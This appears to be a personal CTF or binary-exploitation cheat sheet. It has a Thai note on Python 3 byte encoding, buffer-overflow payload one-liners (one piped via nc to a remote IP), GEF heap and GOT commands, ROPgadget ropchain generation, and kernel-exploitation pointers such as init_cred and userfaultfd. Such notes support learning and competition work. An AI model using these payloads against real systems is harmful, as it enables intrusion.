Use py2 for the best experience
py3 มีปัญหาเพราะว่ามันไม่ได้ใช้ raw byte แต่เป็น utf-8 ทำให้ \x80 กลายเป็น c2 80 
reference : https://stackoverflow.com/questions/66643873/why-does-buffer-from-x80-utf8-return-buffer-c2-80

Or py3

(python 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde')

(python3 -c '__import__("sys").stdout.buffer.write(b"\xc0" * 24  + b"\xe3" + b"\xbe" +  b"\xee" + b"\xf3"     b"\xce" + b"\x91" + b"\xbe"             + b"\n")') |   nc 43.229.151.187 37734

gdb-gef> r <<< $(echo -e 'aaaaaaaaaaaa')

 echo "abc\x00\x00\x00" | file
 echo "abc\x00\x00\x00" | hexdump -C

(echo "-1\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n0\n16\n4200565\n-1\nn" ;cat) | nc 123 256

/heap0 `python -c 'import sys; sys.stdout.write("brabrabra")'`

ROPgadget --ropchain --binary libc.so.6

gdb-gef> tele $rsp-0x50
gdb-gef> got
gdb-gef> vis
gdb-gef> fastbins
gdb-gef> heap chunks
gdb-gef> deref 0x55555fffff

/srv/usr/lib/x86_64-linux-gnu/libc.so.6

nm -n vmlinux | grep init_cred

r = gdb.debug(elf.path, gdbscript=script) 

/proc/sys/vm/unprivileged_userfaultfd
/proc/kallsyms
